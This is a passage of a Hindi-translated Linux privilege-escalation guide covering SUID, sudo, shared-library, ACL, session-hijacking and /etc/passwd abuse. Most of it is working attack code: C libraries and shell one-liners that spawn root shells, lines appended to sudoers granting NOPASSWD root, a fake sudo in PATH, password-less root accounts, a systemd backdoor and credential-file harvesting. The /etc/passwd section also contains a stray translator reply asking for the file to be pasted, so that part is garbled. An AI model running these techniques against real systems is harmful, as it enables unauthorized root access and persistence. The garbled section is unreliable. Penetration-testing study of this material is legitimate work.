यह तकनीक तब भी उपयोग की जा सकती है यदि एक **suid** binary किसी अन्य command को बिना path बताए execute करती है (हमेशा किसी अजीब SUID binary की सामग्री _**strings**_ से जाँच करें)।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी जिसमें command path निर्दिष्ट हो

यदि **suid** बाइनरी कोई अन्य command path निर्दिष्ट करते हुए execute करती है, तो आप उस command के नाम से एक **export a function** करने की कोशिश कर सकते हैं जिसे suid फाइल कॉल कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ को कॉल करती है तो आपको वह function बनाकर export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित किया जाएगा।

### SUID wrapper द्वारा निष्पादित लिखने योग्य script

एक सामान्य custom-app misconfiguration यह है कि root-owned SUID binary wrapper किसी script को निष्पादित करता है, जबकि वह script स्वयं low-priv users द्वारा लिखने योग्य होता है।

सामान्य पैटर्न:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands append कर सकते हैं और फिर SUID wrapper execute कर सकते हैं:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जाँच:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
यह आक्रमण मार्ग विशेष रूप से `/usr/local/bin` में भेजे गए "maintenance"/"backup" wrappers में आम है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को निर्दिष्ट करने के लिए किया जाता है जिन्हें loader अन्य सभी लाइब्रेरीज़ से पहले लोड करता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library का preloading कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस विशेषता के दुरुपयोग को रोकने के लिए, खासकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- लॉडर उन executables के लिए **LD_PRELOAD** को नज़रअंदाज़ कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वे लाइब्रेरीज़ preload की जाती हैं जो standard paths में हैं और जो स्वयं suid/sgid हैं।

Privilege escalation हो सकता है यदि आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ कमांड चलाने पर भी मान्यता प्राप्त होने की अनुमति देता है, जिससे संभावित रूप से उच्च privileges के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> समान privesc का दुरुपयोग किया जा सकता है अगर attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी ऐसे binary में **SUID** permissions मिलें जो असामान्य लगे, तो यह अच्छी प्रथा है कि जांच की जाए कि वह **.so** फाइलों को ठीक से लोड कर रहा है या नहीं। इसे जाँचने के लिए निम्नलिखित कमांड चलाएँ:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करना संभावित exploitation का संकेत देता है।

इसे exploit करने के लिए, कोई C फ़ाइल बनाकर आगे बढ़ेगा, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और एक shell को elevated privileges के साथ execute करके privileges बढ़ाने का प्रयास करता है।

उपर्युक्त C file को एक shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
आखिरकार, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने ऐसा SUID बाइनरी पा लिया है जो उस फ़ोल्डर से लाइब्रेरी लोड कर रहा है जहाँ हम लिख सकते हैं, तो आइए उस फ़ोल्डर में आवश्यक नाम से लाइब्रेरी बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस प्रकार की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक सावधानीपूर्वक चयनित सूची है Unix binaries की जिन्हें एक attacker द्वारा स्थानीय सुरक्षा सीमाओं को बायपास करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी यही है लेकिन उन मामलों के लिए जहाँ आप कमांड में **only inject arguments** ही कर पाते हैं।

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **`sudo`** का उपयोग करके कुछ execute किया होना चाहिए पिछले **15mins** में (default के तौर पर यही sudo token की अवधि है जो हमें `sudo` बिना password के उपयोग करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` उपलब्ध होना चाहिए (आप इसे upload कर सकें)

(आप अस्थायी रूप से `ptrace_scope` सक्षम कर सकते हैं with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा **root के स्वामित्व वाली setuid के साथ**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बने किसी भी फ़ाइल पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में PID 1234 के साथ आपका एक shell है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फाइल `/etc/sudoers` और `/etc/sudoers.d` के भीतर की फाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप **कुछ दिलचस्प जानकारी प्राप्त** कर सकते हैं, और यदि आप कोई फाइल **लिख** सकते हैं तो आप **escalate privileges** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आपके पास लिखने की अनुमति है, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प होते हैं, जैसे OpenBSD के लिए `doas` — इसके कॉन्फ़िगरेशन को `/etc/doas.conf` पर चेक करना न भूलें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **उपयोगकर्ता सामान्यतः किसी मशीन से कनेक्ट करता है और `sudo` का उपयोग करता है** privileges बढ़ाने के लिए और आपने उस उपयोगकर्ता संदर्भ में एक shell प्राप्त कर लिया है, तो आप **एक नया sudo executable** बना सकते हैं जो पहले आपकी कोड को root के रूप में चलाएगा और फिर उपयोगकर्ता के कमांड को चलाएगा। फिर, उपयोगकर्ता संदर्भ का **$PATH** संशोधित करें (उदाहरण के लिए नए path को .bash_profile में जोड़कर) ताकि जब उपयोगकर्ता sudo चलाए, तो आपका sudo executable चलाया जाए।

ध्यान दें कि यदि उपयोगकर्ता कोई अलग shell (bash नहीं) उपयोग करता है तो आपको नए path को जोड़ने के लिए अन्य फाइलों को संशोधित करने की आवश्यकता होगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में देख सकते हैं

या कुछ ऐसा चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **लाइब्रेरीज़** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, यह प्रोग्राम द्वारा उसी स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक दुष्ट लाइब्रेरी बनाएं, इसके लिए चलाएँ: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities एक process को उपलब्ध root privileges का एक subset प्रदान करते हैं। यह प्रभावी रूप से root privileges को छोटे और विशिष्ट units में विभाजित कर देता है। इन units में से प्रत्येक को स्वतंत्र रूप से processes को आवंटित किया जा सकता है। इस तरह पूरे privileges का सेट घट जाता है, जिससे exploitation के जोखिम कम होते हैं।\
अधिक जानने के लिए कि capabilities क्या हैं और इन्हें कैसे abuse किया जा सकता है, निम्न पृष्ठ पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

एक directory में, **bit for "execute"** का अर्थ है कि प्रभावित user folder में "**cd**" कर सकता है।\
**"read"** bit का अर्थ है कि user **list** कर सकता है **files**, और **"write"** bit का अर्थ है कि user **delete** और **create** कर सकता है नए **files**।

## ACLs

Access Control Lists (ACLs) पारंपरिक ugo/rwx permissions को ओवरराइड करने में सक्षम discretionary permissions की द्वितीयक परत का प्रतिनिधित्व करते हैं। ये permissions फ़ाइल या directory एक्सेस पर नियंत्रण बढ़ाते हैं, उन specific users को अधिकार देने या नकारने की अनुमति देकर जो owner नहीं हैं या group का हिस्सा नहीं हैं। यह स्तर अधिक सूक्ष्मता के साथ अधिक सटीक access management सुनिश्चित करता है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" को फ़ाइल पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins पर छिपा हुआ ACL backdoor

एक सामान्य गलत कॉन्फ़िगरेशन यह है कि `/etc/sudoers.d/` में root-स्वामित्व वाली फ़ाइल जिसका mode `440` है, फिर भी ACL के जरिए low-priv user को लिखने की अनुमति देती है।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आप कुछ इस तरह देखते हैं `user:alice:rw-`, तो उपयोगकर्ता restrictive mode bits के बावजूद एक sudo नियम जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
This is a high-impact ACL persistence/privesc path because it is easy to miss in `ls -l`-only reviews.

## खुले shell sessions

पुराने संस्करणों में आप किसी अलग user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं।\
नवीनतम संस्करणों में आप केवल अपने user के screen sessions से ही **connect** कर पाएंगे। हालाँकि, आप session के अंदर **interesting information** पा सकते हैं।

### screen sessions hijacking

**screen sessions को सूचीबद्ध करें**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **old tmux versions** के साथ थी। मैं root द्वारा बनाए गए tmux (v2.1) session को एक non-privileged user के रूप में hijack नहीं कर पाया।

**tmux sessions की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** के लिए एक उदाहरण देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 और 13 मई, 2008 के बीच Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर बनाए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं。\
यह बग उन OS में नया ssh key बनाते समय उत्पन्न होता है, क्योंकि **केवल 32,768 संभावनाएँ संभव थीं**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **यदि आपके पास ssh public key है तो आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH दिलचस्प कॉन्फ़िगरेशन मान

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि सर्वर खाली password strings वाले अकाउंट्स में login की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### लॉगिन नियंत्रण फ़ाइलें

ये फ़ाइलें यह प्रभावित करती हैं कि कौन लॉगिन कर सकता है और कैसे:

- **`/etc/nologin`**: यदि मौजूद है, तो non-root logins को ब्लॉक करता है और अपना संदेश प्रिंट करता है।
- **`/etc/securetty`**: यह सीमित करता है कि root कहाँ लॉगिन कर सकता है (TTY allowlist)।
- **`/etc/motd`**: पोस्ट-लॉगिन बैनर (environment या maintenance विवरण leak कर सकता है)।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और तभी लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जो user authentication के लिए उपयोग किए जा सकते हैं। यह `%h` जैसे टोकन रख सकता है, जिसे user's home directory द्वारा प्रतिस्थापित किया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**. उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप अपनी **use your local SSH keys instead of leaving keys** (without passphrases!) अपने server पर रखे बिना उपयोग कर सकें। इसलिए आप ssh के माध्यम से **jump** करके **to a host** पहुँच सकेंगे और वहां से **jump to another** host कर पाएंगे, **using** उस **key** का जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो हर बार जब user किसी दूसरी मशीन पर जाता है, उस होस्ट को keys तक पहुँच मिल जाएगी (यह एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **options** को **override** कर सकती है और इस कॉन्फ़िगरेशन को allow या denied कर सकती है.\
फ़ाइल `/etc/sshd_config` कीवर्ड `AllowAgentForwarding` के साथ ssh-agent forwarding को **allow** या **denied** कर सकती है (डिफ़ॉल्ट allow है)।

यदि आप पाते हैं कि किसी environment में Forward Agent configured है तो निम्नलिखित पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत मौजूद फ़ाइलें वे **scripts हैं जो तब execute होती हैं जब कोई user नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **write या modify कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलता है तो आपको इसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### Passwd/Shadow Files

OS के आधार पर `/etc/passwd` और `/etc/shadow` फाइलें किसी अलग नाम से हो सकती हैं या उनका कोई बैकअप मौजूद हो सकता है। इसलिए यह सलाह दी जाती है कि आप **सभी को खोजें** और **जाँचें कि क्या आप इन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि फाइलों के अंदर **if there are hashes** हैं:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक से password जेनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
मुझे उस फ़ाइल का कंटेंट नहीं मिला (src/linux-hardening/privilege-escalation/README.md)। कृपया उस README.md की सामग्री यहाँ पेस्ट करें।  

क्या आप चाहते हैं कि मैं एक पासवर्ड स्वतः जनरेट करूँ? अगर हाँ, तो पासवर्ड की लंबाई और किस तरह के अक्षरों (letters, numbers, symbols) चाहिए, बताइए। मैं आगे दी गई फाइल का हिंदी में अनुवाद कर दूँगा और अंत में या बताई गई जगह पर यूज़र `hacker` और जनरेट किया गया पासवर्ड जोड़ दूँगा।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

आप अब `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं।\
WARNING: इससे मशीन की वर्तमान सुरक्षा कमजोर हो सकती है।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है; साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सर्विस कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर **tomcat** सर्वर चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित होगा।

### फोल्डर जांचें

निम्न फोल्डरों में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी को पढ़ नहीं पाएंगे लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह **कई संभावित फ़ाइलों जिनमें पासवर्ड हो सकते हैं** की तलाश करता है।\
